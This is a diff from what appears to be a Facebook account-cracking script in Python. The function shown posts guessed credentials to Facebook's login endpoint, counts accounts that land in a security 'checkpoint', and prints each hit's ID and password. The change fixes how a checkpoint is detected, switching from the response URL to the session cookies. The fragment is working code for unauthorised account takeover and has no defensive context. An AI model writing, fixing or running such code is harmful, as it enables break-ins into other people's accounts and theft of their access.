@@ -1580,8 +1580,8 @@ def fankymobile(idf,pwv):
 					data.update({fannnn.get('name'): fannnn.get('value')})
 			data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd','__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
 			ses.headers.update({'referer': 'https://www.facebook.com/login/?next&ref=dbl&fl&refid=8'})
-			po = ses.post('https://www.facebook.com/login/device-based/regular/login/', data=data).text
-			if "checkpoint" in po.url:
+			po = ses.post('https://www.facebook.com/login/device-based/regular/login/',data=data).text
+			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp += 1
 				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
 				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
